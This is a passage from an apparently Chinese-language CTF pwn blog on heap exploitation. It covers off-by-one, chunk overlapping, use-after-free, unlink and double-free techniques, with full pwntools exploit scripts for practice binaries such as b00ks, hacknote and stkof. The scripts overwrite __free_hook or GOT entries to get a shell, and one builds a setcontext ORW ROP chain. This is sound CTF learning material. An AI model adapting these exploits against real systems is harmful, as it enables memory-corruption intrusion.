class="number">0x7f57ac9ef000</span>))<span class="comment">#index = 1  change</span></span><br><span class="line">cre(<span class="number">0x67</span>,<span class="number">16</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0x1</span>)+<span class="string">b&#x27;\x00&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;b&#x27;</span>)<span class="comment">#index = 2</span></span><br><span class="line">cre(<span class="number">0x67</span>,<span class="number">16</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0x1</span>)+<span class="string">b&#x27;\x00&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;b&#x27;</span>)<span class="comment">#index = 3</span></span><br><span class="line"></span><br><span class="line">cre(<span class="number">0x67</span>,<span class="number">16</span>*<span class="string">b&#x27;a&#x27;</span>+p32(<span class="number">0x1</span>)+<span class="string">b&#x27;\x00&#x27;</span>,(<span class="number">0xb08</span>-<span class="number">0xaf5</span>-<span class="number">0x8</span>)*<span class="string">b&#x27;b&#x27;</span>+p64(one[<span class="number">0</span>])+p64(__libc_reallocadd+<span class="number">12</span>))<span class="comment">#index = 4</span></span><br><span class="line">de(<span class="number">1</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">b&#x27;How long is your note?\n&#x27;</span>,<span class="string">b&#x27;24&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="file-LIST-ALL"><a href="#file-LIST-ALL" class="headerlink" title="file_LIST_ALL"></a>file_LIST_ALL</h2><blockquote>
<p><a href="https://cord-nape-83b.notion.site/apple2-ecb92e976ae74ff3a1f5788d4623ced7">https://cord-nape-83b.notion.site/apple2-ecb92e976ae74ff3a1f5788d4623ced7</a></p>
</blockquote>
<h2 id="orw-setcontext"><a href="#orw-setcontext" class="headerlink" title="orw+setcontext"></a>orw+setcontext</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ROPgadget --binary libc.so.6  --only &quot;mov|call&quot; </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000167420 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span> ,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(__free_hook)) <span class="comment">#18</span></span><br><span class="line">add(<span class="number">0x20</span> ,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 20</span></span><br><span class="line">add(<span class="number">0x20</span> ,p64(magic_gadget)) <span class="comment"># 27</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span> , p64(<span class="number">0</span>) + p64(stack_addr)) <span class="comment"># 28   调用free的时候将stackaddr -&gt; rdx</span></span><br><span class="line">success(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">stack = <span class="string">b&#x27;./flag\x00\x00&#x27;</span> + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(setcontext_61)</span><br><span class="line">stack+= <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0xa0</span>-<span class="number">0x28</span>)</span><br><span class="line">stack+= p64(orw_addr) + p64(ret_addr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xb0</span> ,stack) <span class="comment"># 29</span></span><br><span class="line"></span><br><span class="line">orw = p64(pop_rdi_ret) + p64(stack_addr)</span><br><span class="line">orw+= p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">orw+= p64(syscall_ret)</span><br><span class="line">orw+= p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">orw+= p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">orw+= p64(pop_rdx_r12_ret) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw+= p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw+= p64(syscall_ret)</span><br><span class="line">orw+= p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw+= p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">orw+= p64(pop_rdx_r12_ret) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw+= p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw+= p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span> ,orw) <span class="comment"># 30</span></span><br><span class="line"><span class="comment">#gdb.attach(s)</span></span><br><span class="line">delete(<span class="number">28</span>)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>userpwn</category>
      </categories>
      <tags>
        <tag>userpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>heap利用(入门)</title>
    <url>/2024/08/01/userpwn/heap%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h1><p>在一个可以写的区域伪造chunk（通过off-by-one使系统的指向chunk的指针能指向伪造chunk）</p>
<p><strong>注意chunk的大小的构造</strong></p>
<p><strong>其中指针有多层，因此可以泄露并且修改，p2地址泄露之后，覆盖p2为想要操作的地址，将p4将内容改为想要的内容</strong></p>
<ol>
<li><strong>p1-&gt;p2-&gt;内容</strong></li>
<li><strong>p1-&gt;p4-&gt;内容(更改p1的值)</strong></li>
</ol>
<p><strong>3.p1-&gt;p4-&gt;新内容（更改p1的指向的值）</strong></p>
<p><strong>对于一二步骤p1在第二层，但是对于第一步骤p1在第一层</strong></p>
<p><strong>想更改p1的间接内容，需要更新p1的指向为p4，需要把p1移到第二层（先泄露&amp;p1，然后再一个块的内部伪造一个新的chunk，其中放入&amp;p1，成功将其到第二层），通过fakechunk的一些操作可以更改p1的值（也就是改为&amp;p4），这样可以更改p4指向的内容，那么p1应该改成什么（改成泄露的重要地址，此题通过p1的指向来泄露，也就是&amp;p4和&amp;p2有着千丝万缕的关系）</strong></p>
<p><strong>更改p的值，和p的指向的值</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">binary = ELF(<span class="string">&quot;b00ks&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/l/how2heap/glibc-all-in-one/libs/2.21-0ubuntu4.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createbook</span>(<span class="params">name_size, name, des_size, des</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book name size: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(name_size), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(name), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book description size: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(des_size), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book description: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(des), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printbook</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">id</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;ID: &quot;</span>)</span><br><span class="line">        book_id = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">        <span class="built_in">print</span>(book_id)</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Name: &quot;</span>)</span><br><span class="line">        book_name = io.recvline().strip()</span><br><span class="line">        <span class="built_in">print</span>(book_name)</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Description: &quot;</span>)</span><br><span class="line">        book_des = io.recvline().strip()</span><br><span class="line">        <span class="built_in">print</span>(book_des)</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Author: &quot;</span>)</span><br><span class="line">        book_author = io.recvline().strip()</span><br><span class="line">        <span class="built_in">print</span>(book_author)</span><br><span class="line">    <span class="keyword">return</span> book_id, book_name, book_des, book_author</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changename</span>(<span class="params">name</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Enter author name: &#x27;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(name).encode(<span class="string">&#x27;ascii&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editbook</span>(<span class="params">book_id, new_des</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter the book id you want to edit: &quot;</span>,book_id)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter new book description: &quot;</span>,new_des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletebook</span>(<span class="params">book_id</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter the book id you want to delete: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(book_id).encode(<span class="string">&#x27;ascii&#x27;</span>)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exitpro</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>, <span class="string">b&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Enter author name: &quot;</span>,<span class="number">32</span>*<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">createbook(<span class="string">&quot;32&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;272&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">createbook(<span class="string">&quot;135168&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;135168&quot;</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line">book_id_1,book_name,book_des,book_author=printbook([<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(book_author[<span class="number">32</span>:<span class="number">38</span>])</span><br><span class="line">book1_addr=u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;book1_address:&quot;</span>+<span class="built_in">hex</span>(book1_addr))</span><br><span class="line">p2vmmap = book1_addr+<span class="number">0x40</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(p2vmmap))</span><br><span class="line"></span><br><span class="line">payload=(<span class="number">0x58</span>+<span class="number">0x60</span>)*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x31</span>)+p64(<span class="number">0x1</span>)+p64(p2vmmap)+p64(p2vmmap)+p64(<span class="number">0x20</span>)</span><br><span class="line">editbook(<span class="string">b&#x27;1&#x27;</span>, payload)</span><br><span class="line">changename(<span class="string">&quot;A&quot;</span>*<span class="number">32</span>)</span><br><span class="line">book_id_1,book_name,book_des,book_author=printbook([<span class="number">1</span>])</span><br><span class="line">book2_des_addr=u64(book_des.ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">libc_base=book2_des_addr-<span class="number">0x5a3010</span></span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">sysbin = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">log.success(<span class="string">&quot;sysbin:&quot;</span>+<span class="built_in">hex</span>(sysbin))</span><br><span class="line">editbook(<span class="string">b&#x27;1&#x27;</span>,p64(free_hook))</span><br><span class="line">editbook(<span class="string">b&#x27;2&#x27;</span>,p64(sysbin))</span><br><span class="line">createbook(<span class="string">&quot;8&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">deletebook(<span class="number">3</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="overslaping"><a href="#overslaping" class="headerlink" title="overslaping"></a>overslaping</h1><p><strong>和off-by-one有异曲同工之处，相同在，想方设法越权控制chunk字段，此方法就是将小chunk包含再大chunk之中，虽然我不能控制小chunk但是我可以控制大chunk进而控制小chunk，但是控制小chunk也是通过大chunk的某些字段实现，因此当更改小chunk某些字段之后，大chunk就失效了，因此只能利用一次，在一个地址处进行读写，此题是freegot</strong></p>
<p><strong>此题成功点在于fastbin的利用，fastbin的安全检查太少，链入链表只会检查和头是否重复，可以看出fastbin是一个用来攻击的破解点，需好好利用</strong></p>
<p><strong>此题的另一个重要漏洞是free参数的传递，其会直接传递用户指针，这样子参数就可控了</strong></p>
<p><strong>而想要控制大chunk包含小chunk需要溢出大chunk的size字段，使其可以包含小chunk</strong></p>
<p><strong>比较有意思的一点是假的chunk居然可以欺骗pwngdb，由此可以估计出pwngdb的实现就是通过简单的观察heap的相应字段实现的，哈哈哈哈</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/home/l/how2heap/glibc-all-in-one/libs/2.21-0ubuntu4.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    to create a chunk</span></span><br><span class="line"><span class="string">    size:bytes</span></span><br><span class="line"><span class="string">    content:bytes</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,size)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param index: bytes(0 begin)</span></span><br><span class="line"><span class="string">    :param content: bytes</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size : &quot;</span>)</span><br><span class="line">    size = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    <span class="built_in">print</span>(size)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Content : &quot;</span>)</span><br><span class="line">    content = io.recvline().strip()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="keyword">return</span> size,content</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;152&#x27;</span>,<span class="number">144</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x90</span>))</span><br><span class="line">create(<span class="string">b&#x27;24&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;c&#x27;</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">create(<span class="string">b&#x27;10&#x27;</span>,<span class="number">10</span>*<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">edit(<span class="string">b&#x27;0&#x27;</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0x91</span>)+<span class="number">128</span>*<span class="string">b&#x27;b&#x27;</span>+p64(<span class="number">0x90</span>)+<span class="string">b&#x27;\x71&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">freegot = pro.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(freegot))</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;104&#x27;</span>,<span class="number">24</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x70</span>)+p64(freegot)+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">size,content = show(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">freeadd = u64(content.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(size,<span class="built_in">hex</span>(freeadd))</span><br><span class="line">base = freeadd - elf.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">sysadd = elf.symbols[<span class="string">&#x27;system&#x27;</span>]+base</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,p64(sysadd))</span><br><span class="line">delete(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#create(b&#x27;10&#x27;,10*b&#x27;c&#x27;)</span></span><br></pre></td></tr></table></figure>

<h1 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h1><p><strong>和前两者思路差不多基本上就是超越权限的指针访问，当指针free掉但是没有释放，那么低权限的用户再次使用可以更改高权限用户的数据，接着利用高权限的野指针可以访问到想访问到的东西</strong></p>
<p><strong>此题是hacknote，是一道教学题比较基础</strong></p>
<p><strong>py代码如下</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = remote(&quot;node5.buuoj.cn&quot;,29954)</span></span><br><span class="line">io = process(<span class="string">&quot;hacknote&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    to create a chunk</span></span><br><span class="line"><span class="string">    size:bytes</span></span><br><span class="line"><span class="string">    content:bytes</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Note size :&quot;</span>,size)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content :&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">    content = io.recvline().strip()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="keyword">return</span> size,content</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line">create(<span class="string">b&#x27;12&#x27;</span>,p32(magic))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">show(<span class="string">b&#x27;0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>比较基础，原理不过多赘述，就是绕过指针检查，使chunk指针指向chunk地址的地址处，进而修改chunk的时候可以修改chunk指针达到任意地址写的目的，需要知道chunk指针的存储地址，也需要比较多的溢出量，以至于可以修改下一个chunk的prevsize字段和size字段。附上一道题目的py，<a href="https://buuoj.cn/challenges#hitcon2014_stkof">BUUCTF在线评测 (buuoj.cn)</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26354</span>)</span><br><span class="line">elfp = ELF(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendline(size)</span><br><span class="line">    io.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendline(index)</span><br><span class="line">    io.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendline(index)</span><br><span class="line">    io.sendline(size)</span><br><span class="line">    io.send(content)</span><br><span class="line">    io.recv()</span><br><span class="line"></span><br><span class="line">num1 = create(<span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line">num2 = create(<span class="string">b&#x27;280&#x27;</span>)</span><br><span class="line"></span><br><span class="line">num3 = create(<span class="string">b&#x27;280&#x27;</span>)</span><br><span class="line">fd = <span class="number">0x602150</span>-<span class="number">0x18</span></span><br><span class="line">bk = <span class="number">0x602150</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">edit(<span class="string">b&#x27;2&#x27;</span>,<span class="string">b&#x27;288&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x111</span>)+p64(fd)+p64(bk)+<span class="number">0xf0</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x120</span>))</span><br><span class="line">de(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">putplt = elfp.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">putgot = elfp.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">freeplt = elfp.plt[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">atoiplt = elfp.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">freegot = elfp.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(putgot))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(freeplt))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(atoiplt))</span><br><span class="line">edit(<span class="string">b&#x27;2&#x27;</span>,<span class="string">b&#x27;112&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(putgot)+p64(freegot)+p64(<span class="number">0x602158</span>)+<span class="number">5</span>*(<span class="string">b&#x27;cat ./flag&#x27;</span>+<span class="number">6</span>*<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,p64(putplt))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">putadd = u64(io.recv()[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_puts = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">base = putadd - libc_puts</span><br><span class="line">system = base +libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,p64(system))</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment">#io.sendline(&quot;cat flag&quot;)</span></span><br><span class="line">io.recv()</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#io.recv()</span></span><br></pre></td></tr></table></figure>

<h1 id="double-free"><a href="#double-free" class="headerlink" title="double_free"></a>double_free</h1><p>注意一系列的检查吧，搞笑的是检查size的时候居然只看低4字节，因此可以通过hex表找可以伪造堆块的位置，其余的便没了。基本思想就是可以控制free掉的堆块进而改变fd指针，进而可以malloc的任意位置，以ISCC218–Write Some Paper为例，还有比较重要的是，低版本的堆fasbin没有地址对齐检查，否则就不好利用了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">myelf = ELF(<span class="string">&quot;./paper&quot;</span>)</span><br><span class="line">io =process(<span class="string">&quot;./paper&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;2 delete paper\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input the index you want to store(0-9):&quot;</span>,index)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;How long you will enter:&quot;</span>,size)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please enter your content:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;2 delete paper\n&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;which paper you want to delete,please enter it&#x27;s index(0-9):&quot;</span>,index)</span><br><span class="line">create(<span class="string">b&#x27;0&#x27;</span>,<span 